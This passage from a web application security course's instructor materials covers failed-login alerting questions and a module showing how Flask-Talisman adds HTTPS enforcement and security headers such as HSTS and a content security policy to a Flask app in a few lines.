    be able to determine from the log? (Username targeted, source IP,
    timestamps, frequency.)

-   What threshold of failed logins should trigger an alert? Who should
    receive it? How quickly?

**Module 12 --- Supporting Continuous Web Application Security
Improvements**

  -----------------------------------------------------------------------
  **Field**           **Detail**
  ------------------- ---------------------------------------------------
  **OWASP mapping**   All categories --- consolidation and signposting

  **Delivery mode**   Instructor-led walkthrough of Flask-Talisman as a
                      \"security defaults\" library

  **Timing**          \~8 mins --- pairs well with the end-of-course
                      signposting activity

  **What Flask adds** Demonstrates that many security headers and
                      configuration defaults can be applied to an entire
                      Flask application in under 10 lines --- reducing
                      the barrier to \"secure by default\"
  -----------------------------------------------------------------------

**Flask-Talisman: Secure Headers in One Import**

Flask-Talisman applies a comprehensive set of HTTP security headers and
enforces HTTPS by default. Show delegates that \"securing\" an entire
Flask app\'s transport-layer configuration requires fewer than 10
additional lines --- removing the excuse that it\'s too complex.

> pip3 install flask-talisman
>
> from flask import Flask
>
> from flask_talisman import Talisman
>
> app = Flask(\_\_name\_\_)
>
> \# Talisman adds in one call:
>
> \# Strict-Transport-Security (HSTS)
>
> \# X-Content-Type-Options: nosniff
>
> \# X-Frame-Options: SAMEORIGIN
>
> \# X-XSS-Protection: 1; mode=block
>
> \# Content-Security-Policy (configurable)
>
> csp = {
>
> \"default-src\": \[\"\'self\'\"\],
>
> \"script-src\": \[\"\'self\'\"\],
>
> \"style-src\": \[\"\'self\'\"\],
>
> }
>
> Talisman(app, content_security_policy=csp, force_https=False) \#
> force_https=True in production

